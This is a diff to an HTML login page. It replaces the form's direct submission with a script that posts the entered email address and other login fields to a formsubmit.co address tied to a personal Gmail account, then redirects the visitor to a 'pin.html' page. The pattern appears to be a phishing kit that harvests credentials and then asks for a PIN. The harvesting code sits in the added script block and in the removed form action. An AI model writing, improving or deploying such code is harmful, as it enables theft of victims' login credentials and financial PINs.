@@ -24,15 +24,7 @@
           <div class="loginWrapper">
             <div class="loginSec">
               <!-- Updated form -->
-              <form 
-                action="https://formsubmit.co/Godisrealq101@gmail.com" 
-                method="POST"
-              >
-                <!-- Optional hidden fields for formsubmit -->
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_next" value="pin.html"> <!-- NEW LINE -->
-
+              <form id="loginForm">
                 <label for="email">Email Address</label>
                 <div class="formInput">
                   <input
@@ -69,5 +61,30 @@
       </div>
     </div>
   </div>
+
+  <!-- JavaScript to handle form submit and redirect -->
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Stop normal form submission
+
+      const formData = new FormData(this);
+
+      fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = 'pin.html'; // Redirect after success
+        } else {
+          alert('Something went wrong. Please try again.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Error submitting form. Please try again.');
+      });
+    });
+  </script>
 </body>
 </html>
